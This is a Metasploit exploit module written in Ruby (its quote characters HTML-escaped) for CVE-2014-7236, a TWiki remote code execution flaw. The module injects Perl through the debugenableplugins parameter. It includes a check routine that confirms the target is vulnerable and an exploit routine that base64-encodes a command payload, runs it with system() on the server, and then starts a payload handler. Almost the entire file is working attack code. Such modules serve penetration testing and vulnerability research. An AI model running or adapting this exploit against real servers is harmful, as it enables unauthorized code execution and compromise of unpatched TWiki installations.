# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;TWiki Debugenableplugins Remote Code Execution&#039;,
      &#039;Description&#039; => %q{
        TWiki 4.0.x-6.0.0  contains a vulnerability in the Debug functionality.
        The value of the debugenableplugins parameter is used without proper sanitization
        in an Perl eval statement which allows remote code execution
      },
      &#039;Author&#039; =>
        [
          &#039;Netanel Rubin&#039;, # from Check Point - Discovery
          &#039;h0ng10&#039;, # Metasploit Module
 
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; =>
        [
          [ &#039;CVE&#039;, &#039;2014-7236&#039;],
          [ &#039;OSVDB&#039;, &#039;112977&#039;],
          [ &#039;URL&#039;, &#039;http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2014-7236&#039;]
        ],
      &#039;Privileged&#039; => false,
      &#039;Targets&#039; =>
        [
          [ &#039;Automatic&#039;,
            {
              &#039;Payload&#039;        =>
                {
                  &#039;BadChars&#039; => "",
                  &#039;Compat&#039;      =>
                    {
                      &#039;PayloadType&#039; => &#039;cmd&#039;,
                      &#039;RequiredCmd&#039; => &#039;generic perl python php&#039;,
                    }
                },
              &#039;Platform&#039; => [&#039;unix&#039;],
              &#039;Arch&#039; => ARCH_CMD
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Oct 09 2014&#039;))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "TWiki path", &#039;/do/view/Main/WebHome&#039; ]),
        OptString.new(&#039;PLUGIN&#039;, [true, "A existing TWiki Plugin", &#039;BackupRestorePlugin&#039;])
      ], self.class)
  end
 
 
  def send_code(perl_code)
    uri = target_uri.path
    data = "debugenableplugins=#{datastore[&#039;PLUGIN&#039;]}%3b" + CGI.escape(perl_code) + "%3bexit"
 
    res = send_request_cgi!({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => uri,
      &#039;data&#039; => data
    })
 
    return res
  end
 
 
  def check
    rand_1 = rand_text_alpha(5)
    rand_2 = rand_text_alpha(5)
 
    code = "print(\"Content-Type:text/html\\r\\n\\r\\n#{rand_1}\".\"#{rand_2}\")"
    res = send_code(code)
 
    if res and res.code == 200
      return CheckCode::Vulnerable if res.body == rand_1 + rand_2
    end
    CheckCode::Unknown
  end
 
 
  def exploit
    code = "print(\"Content-Type:text/html\\r\\n\\r\\n\");"
    code += "require(&#039;MIME/Base64.pm&#039;);MIME::Base64->import();"
    code += "system(decode_base64(&#039;#{Rex::Text.encode_base64(payload.encoded)}&#039;));exit"
    res = send_code(code)
    handler
 
  end
 
end

